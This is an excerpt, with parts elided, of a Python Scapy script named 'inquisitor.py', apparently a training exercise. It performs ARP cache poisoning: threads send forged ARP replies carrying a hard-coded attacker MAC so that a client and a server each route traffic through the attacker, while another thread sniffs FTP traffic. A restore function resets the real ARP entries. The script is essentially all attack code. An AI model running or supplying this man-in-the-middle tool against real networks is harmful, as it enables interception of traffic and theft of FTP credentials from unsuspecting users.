    ...
    try:
        ...
        while True:
            pkt = Ether(dst=mac_target) / ARP(
                op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_src, hwsrc=attacker_mac
            )
...
def restore_arp(ip_src, mac_src, ip_target, mac_target):
    pkt = Ether(dst=mac_target) / ARP(
        op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_src, hwsrc=mac_src
    )
...
def main():
    if len(sys.argv) != 5:
        print(
            "Usage: sudo python3 inquisitor.py <IP-src> <MAC-src> <IP-target> <MAC-target>"
        )
        sys.exit(1)
    ...
    # Spoof client (target): "I'm the server"
    t1 = threading.Thread(
        target=poison_loop,
        args=(sys.argv[3], sys.argv[4], sys.argv[1], sys.argv[2], "08:00:27:04:42:0f"),
    )

    # Spoof server: "I'm the client"
    t2 = threading.Thread(
        target=poison_loop,
        args=(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], "08:00:27:04:42:0f"),
    )

    # Sniffer
    t3 = threading.Thread(target=sniff_ftp)
